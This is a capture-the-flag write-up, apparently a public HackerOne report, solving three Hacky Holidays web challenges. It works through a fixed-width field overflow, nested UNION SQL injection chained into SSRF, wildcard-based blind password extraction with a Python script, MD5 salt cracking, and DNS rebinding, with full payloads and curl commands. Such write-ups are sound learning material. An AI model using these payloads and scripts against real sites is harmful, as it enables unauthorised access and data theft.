https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

Reading the source code inside this zip (`index.php` in particular), we learn that this site stores all users in a single text file. Each field has a specified length, appended with `#` chars if the data provided is too short:
```
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
```

We want to create an account with `admin=Y` in order to find the flag. In order to do that we must find a bypass that allows us to send through a field with data that is too long for the space provided. This can be accomplished using the `age` field. On signup the `age` field interacts with the following PHP code:
```
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```

`intval` is dangerous because other non-integer values are accepted which could overflow the 3 chars used for the `age` field. In particular using the math notation `1e3` will cause this field to use 4 chars (PHP: `int(1000)=intval("1e3")`) and shift the string allowing us to overwrite the admin char with `Y` using the `lastname` field (set to `YYYYYYYYYYYYYYY`).

Final signup bypass:
```
curl -X POST https://hackyholidays.h1ctf.com/signup-manager/ --data "action=signup&username=$(openssl rand -hex 4)&password=password&age=1e3&firstname=test&lastname=YYYYYYYYYYYYYYY" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/signup-manager/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep -A 1 flag
rm cookie.txt
```

Output:
```
<p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
<p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
```

# Flag 11 -- /r3c0n_server_4fdk59
### Basic functionality
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ is a photo album viewing service. There is a link to an attack-box with a username/password field.
The page mentions "We are currently developing an API, apologies for anything that doesn't work quite right". Visiting `api/` we can see a list of API status codes:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/ 
```
HTTP Status Code Explanation

200 Successful request with data returned

204 Successful request but with no data found

404 Invalid Endpoint

400 Invalid GET/POST variable

401 Unauthenticated Request or Invalid client IP
```
Attempting to access any API endpoint results in an error message:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/test
`{"error":"This endpoint cannot be visited from this IP address"}`

### Hack
Images are loaded using base64 encoded JSON, for example:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9
This uses the JSON:
`{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}`

**Objective**
We want to use the `image` path to access the `api/` endpoints. We cannot edit the JSON directly as the `auth` hash would be incorrect. We also cannot guess accurate `auth` hashes.

**Vulnerability**
The only vulnerability is a read-only SQLi here:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k

Sqlmap picks this up:
```
# python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
...
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=jdh34k' AND 5370=5370 AND 'iWZY'='iWZY

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-4955' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6271,0x584f6849685a57534759426b6f6a786945666b646147476e745856655a656c41776a46495a6a6a63,0x71716b6a71)-- -
---

# python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
...
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
...
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```
**Stage 1 -- first SQLi**
We cannot use this SQLi to change the content of the database. We can however use the `UNION` spotted by sqlmap to append a row to the query output.

Payload: `INVALID' UNION ALL SELECT "1","unused","unused album title"-- -`
One row of data returned by query: `"1","unused","unused album"`
URL: 
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%221%22,%22unused%22,%22unused%20album%20title%22--%20-
Note that the page returns two images corresponding to album id `1`. This implies the `1` we are returning from this query is being fed into another query.

**Stage 2 -- second SQLi**
Attempting to exploit this manually, we suspect the query will look something like:
`select id, album_id, photo from photo where album_id='<injection point>'`

With that in mind we can build a similar `UNION` based exploit within the first query to append another row, generating a valid, signed base64 URL.
New payload: `' union all select 99,'test','abc'-- -`
Added to previous payload: `INVALID' UNION ALL SELECT "' union all select 99,'test','abc'-- -","unused","unused album title"-- -`
URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27abc%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-
This generated an image link:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2FiYyIsImF1dGgiOiIxOTM5YzkzNjRmMWU3MjBmNDE3NzMyMzkxZDRmNjJjZiJ9
`{"image":"r3c0n_server_4fdk59\/uploads\/abc","auth":"1939c9364f1e720f417732391d4f62cf"}`
Note the `abc` is what we provided above in our second stage payload. Visiting that URL, we see this URL does not exist:
`Expected HTTP status 200, Received: 404`

**Stage 3 -- API discovery using SSRF**
Using a script nearly identical to the one below (for guessing the password), the endpoints `../api/ping` and `../api/user` are both valid.
`../api/ping`:
album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27../api/ping%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-
image: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==
Response: 
`Invalid content type detected`

`../api/user`:
album: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27../api/user%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-
image: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==
Response:
`Invalid content type detected`

`Invalid content type detected` likely means that we received data here, but not a valid image.

**Stage 4 -- additional API discovery using SSRF**
We detect that `../api/user` has parameters by providing an invalid one:
`../api/user?abc=xyz` -> `Expected HTTP status 200, Received: 400`

Above, in the API description, a 400 response was described as "400 Invalid GET/POST variable".

Using a script nearly identical to the one below (for guessing the password), we can spot only two exceptions are `username` and `password`:
`../api/user?username=xyz` -> `Expected HTTP status 200, Received: 204`
`../api/user?password=xyz` -> `Expected HTTP status 200, Received: 204`

Above, in the API description, a 204 response was described as "204 Successful request but with no data found"

**Stage 5 -- Final wildcard SQLi**
The username/password are guessable using a SQL wildcard character. Using `%25` (URL encoded `%`) we can derive the correct username and password! For example:
`../api/user?username=xyz` -> `Expected HTTP status 200, Received: 204`
`../api/user?username=%25` -> `Invalid content type detected`
`../api/user?username=a%25` -> `Expected HTTP status 200, Received: 204`
`../api/user?username=g%25` -> `Invalid content type detected`
(reference https://data-flair.training/blogs/sql-wildcard/ )

Using this technique we can guess the username is `grinchadmin`. Here is a script to derive the password (a similar script was used on all previous steps):
```
import requests
import re

prefix = ""

while True:

    for i in [*range(48, 57), *range(97, 122)]:
        s = chr(i)
        s = prefix + s + '%25'

        # initial multi-stage SQLi
        r = requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID\' UNION ALL SELECT "\' union all select 99,\'test\',\'../api/user?username=grinchadmin%26password='+s+'\'-- -","unused","unused album title"-- -')

        # trigger SSRF
        if "img-responsive" in r.text:
            result = re.search('<img class="img-responsive" src="(.*)">', r.text)
            r = requests.get('https://hackyholidays.h1ctf.com'+result.group(1))

            if "Invalid content type detected" in r.text:
                print("hit:" +prefix + chr(i))
                prefix = prefix + chr(i)
                break
```
Output:
```
hit:s
hit:s4
hit:s4n
hit:s4nt
hit:s4nt4
hit:s4nt4s
hit:s4nt4su
hit:s4nt4suc
hit:s4nt4suck
hit:s4nt4sucks
```

**Conclusion** 
Attempting to visualize each stage listed above in our final payload:
```
1111111111111111111111111112222222222222222222222222222223333333333334444444445555555555544444444444455555555552222211111111111111111111111111111111111
INVALID' UNION ALL SELECT "' union all select 99,'test','../api/user?username=grinchadmin%26password=s4nt4sucks'-- -","unused","unused album title"-- -
```
Using `grinchadmin:s4nt4sucks` we can log in to /attack-box and reveal the flag:
```
curl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data "username=grinchadmin&password=s4nt4sucks" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
rm cookie.txt
```
Output:
`<h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>`
# Flag 12 -- /attack-box
### Basic functionality
https://hackyholidays.h1ctf.com/attack-box is the "Grinch Network Attack Server" used to target Santa's servers. It can be used to launch attacks against the listed IP addresses.

The website shows the output of launching an attack against an IP address:
```
grinch@attackbox:~/tools$ ./ddos --load ba8bf2feeb3b8e5279678e1adc0bcde2.target

Setting Target Information  
Getting Host Information for: 203.0.113.33  
Spinning up botnet  
Launching attack against: 203.0.113.33 / 203.0.113.33  
ping 203.0.113.33  
64 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=15.3 ms  
64 bytes from 203.0.113.33: icmp_seq=2 ttl=118 time=17.6 ms  
64 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=21.7 ms  
Host still up, maybe try again?  
```

### Hack
Our objective is to change the target IP to `localhost` or `127.0.0.1` in order to cause the Grinch to launch an attack on himself!

**Stage 1 -- hash computation**
Attacking an IP address, we are provided a link:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
The base64 payload is:
`{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`

If we try and change `target`, we must also change `hash`. In order to figure out how `hash` is computed, we can brute-force the prefix/salt that is used when forming this MD5 hash:
```
import hashlib

with open('rockyou.txt',encoding='utf8',errors='replace') as f:
    for line in f:
        h = line.strip() + "203.0.113.33"
        output = hashlib.md5(h.encode('utf-8')).hexdigest()
        if output == "5f2940d65ca4140cc18d0878bc398955":
            print("HIT: "+line.strip())
```
(word list: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
(obviously https://hashcat.net/hashcat/ would be faster here :) )

Output:
`HIT: mrgrinch463`

Therefore every hash must be:
`MD5("mrgrinch463" + $target) = $hash`

**Stage 2 -- localhost bypass**
Attempting to provide `127.0.0.1` as a target here results in the following output:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```
grinch@attackbox:~/tools$ ./ddos --load 3390c49ed47433d38ca2d10b582ac93d.target

Setting Target Information  
Getting Host Information for: 127.0.0.1  
Local target detected, aborting attack
```

Attempting to launch valid attack at `www.example.com`, this script appears to attempt to resolve the DNS value for the target multiple times:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJ3d3cuZXhhbXBsZS5jb20iLCJoYXNoIjoiMDVhYmQyNjM5ZTM4NWZkMzcwYmMyYWY5NDU1OGQwZjAifQ==

```
...
Getting Host Information for: www.example.com <-- initial DNS request  
Host resolves to 93.184.216.34  
Spinning up botnet  
Launching attack against: www.example.com / 93.184.216.34 <-- second DNS request 
...
```

Therefore an DNS rebinding attack appears to be possible! If we can do the following we can get the Grinch to attack himself:
1) return a non-internal IP response from the DNS server for the first request
2) return 127.0.0.1 from the DNS server for the second request

**Conclusion**
Using the following DNS rebinding service we can execute this attack:
https://lock.cmpxchg8b.com/rebinder.html 

Final payload:
`{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}`
URL: 
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
Response:
```
[
  {
    "id": "25225",
    "content": "Setting Target Information",
    "goto": false
  },
  {
    "id": "25226",
    "content": "Getting Host Information for: 01020304.7f000001.rbndr.us",
    "goto": false
  },
  {
    "id": "25227",
    "content": "Host resolves to 1.2.3.4",
    "goto": false
  },
  {
    "id": "25228",
    "content": "Spinning up botnet",
    "goto": false
  },
  {
    "id": "25229",
    "content": "Launching attack against: 01020304.7f000001.rbndr.us / 127.0.0.1",
    "goto": false
  },
  {
    "id": "25230",
    "content": "No Response from attack server, retrying...",
    "goto": false
  },
  {
    "id": "25231",
    "content": "No Response from attack server, retrying...",
    "goto": false
  },
  {
    "id": "25232",
    "content": "No Response from attack server, retrying...",
    "goto": "/attack-box/challenge-completed-a3c589ba2709"
  }
]
```
This forwards us to the final page / flag:
https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709
`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

{F1130976}
- **Report Triaged**
- **2021-01-04** @nahamsec: Hello!

Happy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to █████@hackerone.com 

Thanks,
Ben
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
